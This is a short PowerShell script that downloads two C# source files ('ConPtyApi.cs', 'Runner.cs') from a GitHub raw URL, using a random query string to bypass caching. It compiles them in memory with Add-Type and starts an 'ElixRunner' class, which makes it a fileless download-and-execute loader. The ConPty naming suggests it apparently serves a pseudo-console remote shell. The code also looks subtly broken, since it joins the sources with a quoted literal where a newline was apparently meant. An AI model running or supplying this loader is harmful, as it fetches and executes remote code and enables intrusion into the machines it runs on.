
$u1_raw = "https://raw.githubusercontent.com/Metivzora/RS/main/ConPtyApi.cs"
$u2_raw = "https://raw.githubusercontent.com/Metivzora/RS/main/Runner.cs"


$uri1 = [System.Uri]($u1_raw.Trim() + "?v=" + (Get-Random))
$uri2 = [System.Uri]($u2_raw.Trim() + "?v=" + (Get-Random))

$web = New-Object System.Net.WebClient
try {

    $c1 = $web.DownloadString($uri1)
    $c2 = $web.DownloadString($uri2)

    if ($c1 -and $c2) {

        Add-Type -TypeDefinition ($c1 + "[System.Environment]::NewLine" + $c2)
        

        [ElixRunner]::Start()
    }
} catch {

    Write-Error "Ошибка инициализации: $($_.Exception.Message)"
}
